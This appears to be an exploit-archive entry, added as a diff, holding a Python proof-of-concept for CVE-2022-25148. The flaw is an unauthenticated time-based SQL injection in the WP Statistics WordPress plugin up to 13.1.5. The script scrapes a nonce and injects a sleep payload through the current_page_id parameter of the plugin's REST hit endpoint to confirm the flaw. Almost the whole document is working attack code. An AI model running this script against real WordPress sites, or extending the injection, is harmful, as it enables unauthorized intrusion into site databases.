@@ -1,0 +1,60 @@
+id: 39027
+date: 09/04/2023
+title: WP Statistics Plugin 13.1.5 current_page_id - Time based SQL injection Exploit
+author: psychoSherlock
+cves: CVE-2022-25148
+
+# Exploit Title: WP Statistics Plugin <= 13.1.5 current_page_id - Time based SQL injection (Unauthenticated)
+# Exploit Author: psychoSherlock
+# Vendor Homepage: https://wp-statistics.com/
+# Software Link: https://downloads.wordpress.org/plugin/wp-statistics.13.1.5.zip
+# Version: 13.1.5 and prior
+# Tested on: wp-statistics 13.1.5
+# CVE : CVE-2022-25148
+# Vendor URL: https://wordpress.org/plugins/wp-statistics/
+# CVSS Score: 8.4 (High)
+
+import argparse
+import requests
+import re
+import urllib.parse
+
+
+def main():
+    parser = argparse.ArgumentParser(description="CVE-2022-25148")
+    parser.add_argument('-u', '--url', required=True,
+                        help='Wordpress base URL')
+
+    args = parser.parse_args()
+
+    baseUrl = args.url
+    payload = "IF(1=1, sleep(5), 1)"
+
+    wp_session = requests.session()
+
+    resp = wp_session.get(baseUrl)
+    nonce = re.search(r'_wpnonce=(.*?)&wp_statistics_hit', resp.text).group(1)
+    print(f"Gathered Nonce: {nonce}")
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15"}
+
+    payload = urllib.parse.quote_plus(payload)
+    exploit = f'/wp-json/wp-statistics/v2/hit?_=11&_wpnonce={nonce}&wp_statistics_hit_rest=&browser=&platform=&version=&referred=&ip=11.11.11.11&exclusion_match=no&exclusion_reason&ua=Something&track_all=1&timestamp=11&current_page_type=home&current_page_id={payload}&search_query&page_uri=/&user_id=0'
+    exploit_url = baseUrl + exploit
+
+    print(f'\nSending: {exploit_url}')
+
+    resp = wp_session.get(exploit_url, headers=headers)
+
+    if float(resp.elapsed.total_seconds()) >= 5.0:
+        print("\n!!! Target is vulnerable !!!")
+        print(f'\nTime taken: {resp.elapsed.total_seconds()}')
+    else:
+        print('Target is not vulnerable')
+
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2023-09-11]  #
